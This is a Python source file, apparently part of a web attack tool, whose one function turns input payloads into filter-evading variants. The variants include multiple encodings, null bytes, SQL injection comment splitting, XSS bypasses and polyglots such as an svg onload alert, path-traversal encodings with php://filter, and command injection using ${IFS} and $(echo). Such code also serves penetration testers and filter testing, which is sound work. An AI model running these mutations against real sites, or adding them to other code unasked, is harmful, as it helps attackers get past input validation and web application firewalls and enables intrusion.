import urllib.parse
import base64


def mutate_payloads(payloads, payload_type):
    mutated = []
    for payload in payloads:
        mutations = set()

        # Basic encodings
        mutations.add(urllib.parse.quote(payload))  # URL encode
        mutations.add(urllib.parse.quote(urllib.parse.quote(payload)))  # Double encode

        # Unicode encoding (basic simulation)
        unicode_encoded = ''.join(f"\\u{ord(c):04x}" for c in payload)
        mutations.add(unicode_encoded)

        # Base64 encoding
        try:
            base64_encoded = base64.b64encode(payload.encode()).decode()
            mutations.add(base64_encoded)
        except:
            pass

        # Hexadecimal representation
        hex_encoded = ''.join(f"&#x{ord(c):x};" for c in payload)
        mutations.add(hex_encoded)

        # Null byte (real byte)
        mutations.add(payload + "\x00")

        # SQLi specific
        if payload_type == 'sqli':
            mutations.add(payload.upper())
            mutations.add(payload.lower())
            mutations.add(payload.replace("UNION", "UN/**/ION"))
            mutations.add(payload.replace("SELECT", "SEL/**/ECT"))
            mutations.add(payload + "%00")

        # XSS specific
        if payload_type == 'xss':
            mutations.add(payload.replace("<", "&lt;").replace(">", "&gt;"))
            mutations.add(payload.replace("<script>", "<scr<script>ipt>"))
            # Add some known polyglot examples
            mutations.add('<svg onload=alert(1)>')
            mutations.add('<iframe src=javascript:alert(1)>')

        # LFI/RFI specific
        if payload_type == 'lfi':
            mutations.add(payload.replace("../", "..%2F"))
            mutations.add(payload.replace("../", "..%c0%af"))
            mutations.add("php://filter/convert.base64-encode/resource=" + payload)
            mutations.add(payload + "%00.png")

        # RCE specific
        if payload_type == 'rce':
            mutations.add(payload.replace(" ", "${IFS}"))
            mutations.add("$(echo " + payload + ")")

        # Add original payload back
        mutations.add(payload)

        mutated.extend(mutations)

    return list(mutated)
